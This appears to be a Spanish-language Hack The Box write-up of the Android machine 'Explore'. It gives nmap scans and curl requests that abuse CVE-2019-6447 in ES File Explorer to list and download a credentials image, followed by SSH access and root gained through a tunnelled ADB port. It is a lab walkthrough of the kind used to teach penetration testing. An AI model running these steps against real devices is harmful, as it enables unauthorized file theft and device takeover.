---
title: "Explore"
date: 2022-08-28T20:58:19-05:00
description: "He regresado por la revancha"
type: "post"
tags: ["HTB","writeups","Android"]
showTableOfcontents: true
---
![Banner](/images/Explore.png)
# Enumeración
Realizando un escano de puertos identificamos cuatro puertos abiertos.
```BASH
└─$ sudo nmap -sS --min-rate 5000 -vvv -open -p- -n -Pn -oG nmap/all_ports 10.10.10.247
[sudo] password for kali: 
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower. 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-29 22:36 EDT
Initiating SYN Stealth Scan at 22:36
Scanning 10.10.10.247 [65535 ports]
Discovered open port 42135/tcp on 10.10.10.247
Discovered open port 59777/tcp on 10.10.10.247
Discovered open port 34039/tcp on 10.10.10.247
Discovered open port 2222/tcp on 10.10.10.247
Completed SYN Stealth Scan at 22:37, 15.77s elapsed (65535 total ports)
Nmap scan report for 10.10.10.247
Host is up, received user-set (0.092s latency). 
Scanned at 2022-08-29 22:36:54 EDT for 16s
Not shown: 65530 closed tcp ports (reset), 1 filtered tcp port (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE      REASON
2222/tcp  open  EtherNetIP-1 syn-ack ttl 63
34039/tcp open  unknown      syn-ack ttl 63
42135/tcp open  unknown      syn-ack ttl 63
59777/tcp open  unknown      syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 15.90 seconds
           Raw packets sent: 78350 (3.447MB) | Rcvd: 78347 (3.134MB)
```
Procedemos a realizar un escaneo específico de los puertos encontrados para tratar de averiguar que servicios estan funcionando en los puertos encontrados.
```BASH
└─$ nmap -sCV -p 2222,34039,42135,59777 -Pn -oN nmap/targeted 10.10.10.247       
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-29 22:47 EDT                                               
Nmap scan report for 10.10.10.247                 
Host is up (0.12s latency).                                         
PORT      STATE SERVICE VERSION                                           
2222/tcp  open  ssh     (protocol 2.0)
| fingerprint-strings:
|   NULL:
|_    SSH-2.0-SSH Server - Banana Studio
| ssh-hostkey:
|_  2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb (RSA)                          
34039/tcp open  unknown                                           
| fingerprint-strings:                             
|   GenericLines:                                     
|     HTTP/1.0 400 Bad Request                                           
|     Date: Tue, 30 Aug 2022 02:47:38 GMT                                               
|     Content-Length: 22                                                
|     Content-Type: text/plain; charset=US-ASCII  
|     Connection: Close                  
|     Invalid request line:                 
|   GetRequest:                          
|     HTTP/1.1 412 Precondition Failed       
|     Date: Tue, 30 Aug 2022 02:47:38 GMT         
|     Content-Length: 0                   
|   HTTPOptions:                        
|     HTTP/1.0 501 Not Implemented             
|     Date: Tue, 30 Aug 2022 02:47:43 GMT   
|     Content-Length: 29
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Method not supported: OPTIONS
|   Help: 
|     HTTP/1.0 400 Bad Request
|     Date: Tue, 30 Aug 2022 02:48:00 GMT
|     Content-Length: 26   
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line: HELP
|   RTSPRequest:
|     HTTP/1.0 400 Bad Request
|     Date: Tue, 30 Aug 2022 02:47:43 GMT
|     Content-Length: 39
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     valid protocol version: RTSP/1.0
|   SSLSessionReq:
|     HTTP/1.0 400 Bad Request
|     Date: Tue, 30 Aug 2022 02:48:00 GMT
|     Content-Length: 73
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line:
|     ?G???,???`~?
|     ??{????w????<=?o?
|   TLSSessionReq:
|     HTTP/1.0 400 Bad Request
|     Date: Tue, 30 Aug 2022 02:48:01 GMT
|     Content-Length: 71
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line:
|     ??random1random2random3random4
|   TerminalServerCookie:
|     HTTP/1.0 400 Bad Request
|     Date: Tue, 30 Aug 2022 02:48:01 GMT
|     Content-Length: 54
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line:
|_    Cookie: mstshash=nmap
42135/tcp open  http    ES File Explorer Name Response httpd
|_http-title: Site doesn't have a title (text/html).
59777/tcp open  http    Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older
|_http-title: Site doesn't have a title (text/plain).
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
...
Service Info: Device: phone

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done -- 1 IP address (1 host up) scanned in 111.19 seconds
```
## Puerto 59777
Al buscar información sobre los puertos que no pudieron ser identificados, encontramos que el puerto 59777 está relacionado con el CVE-2019-6447 correspondiente a la aplicación ES File Explorer misma que sabemos esta ejecutandose en el dispositivo por el puerto 42135.

# Explotación
Podemos enviar peticiones al puerto 59777 con un comando a ejecutar por medio de json, por ejemplo:

```BASH
curl http://$TARGET:59777/ -d "{'command':listFiles}"
```

Los comandos aceptados son los siguientes:
- listFiles         
- listPics          
- listVideos        
- listAudios        
- listApps          
- listAppsSystem    
- listAppsPhone     
- listAppsSdcard    
- listAppsAll                 
- getDeviceInfo 

Listando las imagenes con el comando `listPics` encontramos el archivo `creds.jpg`.
```JSON
{
    {
    "name":"creds.jpg",
    "time":"4/21/21 02:38:18 AM",
    "location":"/storage/emulated/0/DCIM/creds.jpg", 
    "size":"1.14 MB (1,200,401 Bytes)"
    }
}
```
Para descargar la imagen simplemente hacemos una petición GET al path completo de la imagen.
```BASH
curl http://$TARGET:59777/storage/emulated/0/DCIM/creds.jpg -o creds.jpg
```

La imagen contiene credenciales, las cuales probamos para conectarnos por medio de SSH.

*Si no se puede establecer la conexión modificar el archivo `~/.ssh/config` con lo siguiente:*
```
host 10.10.10.247
    HostkeyAlgorithms +ssh-rsa
    PubkeyAcceptedAlgorithms +ssh-rsa
```
Al conectarnos por SSH podemos acceder a la flag de usuario localizada en el directorio `/storage/emulated/0`
```BASH
:/storage/emulated/0 $ id
uid=10076(u0_a76) gid=10076(u0_a76) groups=10076(u0_a76),3003(inet),9997(everybody),20076(u0_a76_cache),50076(all_a76) context=u:r:untrusted_app:s0:c76,c256,c512,c768
:/storage/emulated/0 $ ls
Alarms  DCIM     Movies Notifications Podcasts  backups   user.txt 
Android Download Music  Pictures      Ringtones dianxinos
```
# Escalación de Privilegios

Enumeramos los puertos TCP que esten en escucha.
```BASH
:/ $ ss -antl
State       Recv-Q Send-Q Local Address:Port               Peer Address:Port              
LISTEN      0      50           *:59777                    *:*                  
LISTEN      0      8       [::ffff:127.0.0.1]:38535                    *:*                  
LISTEN      0      50       [::ffff:10.10.10.247]:40107                    *:*                  
LISTEN      0      50           *:2222                     *:*                  
LISTEN      0      4            *:5555                     *:*                  
LISTEN      0      10           *:42135                    *:*    
```
Observando los puertos disponibles encontramos el puerto 5555, correspondiente al debugger en android, entonces podemos hacer un tunnel a tráves de ssh para así interactuar con la herramienta adecuada.

```BASH
ssh kristi@10.10.10.247 -p 2222 -L 5555:localhost:5555
```

Ya en nuestro terminal podemos conectarnos mediante adb y forzar el acceso usuario root desde la misma herramienta.
```BASH
└─$ adb connect localhost:5555
* daemon not running; starting now at tcp:5037
* daemon started successfully
connected to localhost:5555
└─$ adb -s localhost:5555 root # Forzamos el acceso a root
restarting adbd as root
└─$ adb -s localhost:5555 shell
x86_64:/  id          
uid=0(root) gid=0(root) groups=0(root),1004(input),1007(log),1011(adb),1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats),3009(readproc),3011(uhid) context=u:r:su:s0
```
Y listo tenemos acceso como root

La flag de root la encontramos en el directorio `/data`.

# Referencias
[CVE-2019-6447 - ExploitDB](https://www.exploit-db.com/exploits/50070)

[Port 5555 - HackTricks](https://book.hacktricks.xyz/network-services-pentesting/5555-android-debug-bridge)
